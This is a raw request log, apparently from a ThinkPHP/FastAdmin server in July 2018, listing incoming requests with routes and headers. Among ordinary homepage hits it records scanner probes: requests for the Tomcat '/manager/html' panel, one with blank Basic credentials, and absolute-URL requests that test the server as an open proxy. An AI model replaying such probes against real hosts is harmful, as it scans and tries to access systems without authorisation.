---------------------------------------------------------------
[ 2018-07-30T00:22:18+08:00 ] 123.249.9.126 GET /manager/html
[ info ] 118.24.114.43:8080/manager/html [运行时间：0.001474s][吞吐率：678.47req/s] [内存消耗：237.91kb] [文件加载：54]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000243s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, */*',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'host' => '118.24.114.43:8080',
  'authorization' => 'Basic Og==',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T01:58:47+08:00 ] 159.65.159.157 GET /
[ info ] 118.24.114.43/ [运行时间：0.001953s][吞吐率：512.00req/s] [内存消耗：381.77kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000246s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'keep-alive' => '300',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'host' => '118.24.114.43',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000091s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T02:00:41+08:00 ] 218.93.201.199 GET /manager/html
[ info ] 118.24.114.43:8080/manager/html [运行时间：0.001422s][吞吐率：703.27req/s] [内存消耗：237.92kb] [文件加载：54]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000232s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, */*',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'host' => '118.24.114.43:8080',
  'authorization' => 'Basic Og==',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T02:13:49+08:00 ] 80.82.70.187 GET http://www.baidu.com/cache/global/img/gs.gif
[ info ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.001621s][吞吐率：616.90req/s] [内存消耗：237.48kb] [文件加载：54]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000246s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T03:03:19+08:00 ] 123.249.35.46 GET /manager/html
[ info ] 118.24.114.43:8080/manager/html [运行时间：0.002132s][吞吐率：469.06req/s] [内存消耗：238.02kb] [文件加载：54]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000380s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705',
  'accept' => '*/*',
  'accept-language' => 'zh-cn,en-us;q=0.5',
  'host' => '118.24.114.43:8080',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T03:14:44+08:00 ] 186.233.176.44 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001922s][吞吐率：520.26req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000270s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000069s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T03:55:17+08:00 ] 92.113.1.67 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001804s][吞吐率：554.36req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000234s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000068s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T04:03:03+08:00 ] 60.191.52.254 HEAD http://112.124.42.80:63435/
[ info ] 112.124.42.80:63435http://112.124.42.80:63435/ [运行时间：0.001907s][吞吐率：524.42req/s] [内存消耗：382.70kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000271s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'bs_real_ip' => 'TmpBdU1Ua3hMalV5TGpJMU5Dd3hNVEl1TVRjdU1USTFMakU0TUE9PQ==',
  'host' => '112.124.42.80:63435',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'proxy-connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000071s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T04:03:04+08:00 ] 60.191.52.254 HEAD http://112.124.42.80:63435/
[ info ] 112.124.42.80:63435http://112.124.42.80:63435/ [运行时间：0.001540s][吞吐率：649.27req/s] [内存消耗：382.70kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000205s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'bs_real_ip' => 'TmpBdU1Ua3hMalV5TGpJMU5Dd3hNVEl1TVRjdU1USTFMakU0TUE9PQ==',
  'host' => '112.124.42.80:63435',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'proxy-connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000059s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T04:03:08+08:00 ] 60.191.52.254 HEAD http://112.124.42.80:63435/
[ info ] 112.124.42.80:63435http://112.124.42.80:63435/ [运行时间：0.001815s][吞吐率：550.94req/s] [内存消耗：382.70kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000289s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'bs_real_ip' => 'TmpBdU1Ua3hMalV5TGpJMU5Dd3hNVEl1TVRjdU1USTFMakU0TUE9PQ==',
  'host' => '112.124.42.80:63435',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'proxy-connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000067s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T04:03:15+08:00 ] 60.191.52.254 HEAD http://112.124.42.80:63435/
[ info ] 112.124.42.80:63435http://112.124.42.80:63435/ [运行时间：0.001823s][吞吐率：548.56req/s] [内存消耗：382.70kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000231s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'bs_real_ip' => 'TmpBdU1Ua3hMalV5TGpJMU5Dd3hNVEl1TVRjdU1USTFMakU0TUE9PQ==',
  'host' => '112.124.42.80:63435',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'proxy-connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000071s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T04:03:21+08:00 ] 60.191.52.254 HEAD http://112.124.42.80:63435/
[ info ] 112.124.42.80:63435http://112.124.42.80:63435/ [运行时间：0.002734s][吞吐率：365.77req/s] [内存消耗：382.70kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000022s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000353s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'bs_real_ip' => 'TmpBdU1Ua3hMalV5TGpJMU5Dd3hNVEl1TVRjdU1USTFMakU0TUE9PQ==',
  'host' => '112.124.42.80:63435',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'proxy-connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000104s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T04:03:33+08:00 ] 60.191.52.254 HEAD http://112.124.42.80:63435/
[ info ] 112.124.42.80:63435http://112.124.42.80:63435/ [运行时间：0.002100s][吞吐率：476.19req/s] [内存消耗：382.70kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000249s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'bs_real_ip' => 'TmpBdU1Ua3hMalV5TGpJMU5Dd3hNVEl1TVRjdU1USTFMakU0TUE9PQ==',
  'host' => '112.124.42.80:63435',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'proxy-connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000069s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T04:13:09+08:00 ] 80.90.225.21 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.002891s][吞吐率：345.89req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000023s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000462s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000110s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T05:01:52+08:00 ] 60.191.38.77 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001880s][吞吐率：531.93req/s] [内存消耗：381.67kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000014s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000260s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000067s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T05:16:54+08:00 ] 185.129.118.110 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.001787s][吞吐率：559.61req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000015s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000244s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000066s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T05:47:28+08:00 ] 5.236.171.93 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.002248s][吞吐率：444.83req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000279s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000153s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T06:58:38+08:00 ] 94.183.118.19 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.034459s][吞吐率：29.02req/s] [内存消耗：650.57kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000064s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002158s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001628s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T07:31:00+08:00 ] 177.102.28.218 GET /
[ info ] 118.24.114.43:8080/ [运行时间：0.003872s][吞吐率：258.25req/s] [内存消耗：381.65kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000069s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000260s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '118.24.114.43:8080',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000134s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2018-07-30T07:57:46+08:00 ] 177.155.82.226 GET /
[ info ] 118.24.114.43/ [运行时间：0.002004s][吞吐率：498.97req/s] [内存消耗：381.77kb] [文件加载：69]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000259s ]
[ info ] [ LANG ] /var/www/fastadmin/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'keep-alive' => '300',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'host' => '118.24.114.43',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000072s ]
[ info ] [ LANG ] /var/www/fastadmin/public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ /var/www/fastadmin/application/index/controller/Index.php ]
[ info ] [ VIEW ] /var/www/fastadmin/public/../application/index/view/index/index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
